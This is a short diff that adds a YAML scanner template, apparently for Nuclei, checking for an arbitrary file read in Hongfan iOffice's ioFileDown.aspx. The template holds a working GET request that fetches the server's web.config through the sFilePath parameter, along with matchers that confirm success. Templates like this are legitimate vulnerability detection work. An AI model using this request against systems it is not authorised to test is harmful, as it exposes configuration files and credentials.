@@ -1,0 +1,24 @@
+id: poc-yaml-ioffice-iofiledown-read-any-file
+info:
+  name: 红帆iOffice ioFileDown任意文件读取
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ioffice/prg/interface/ioFileDown.aspx?sFilePath=/ioffice/web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
+          - "<configSections>"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
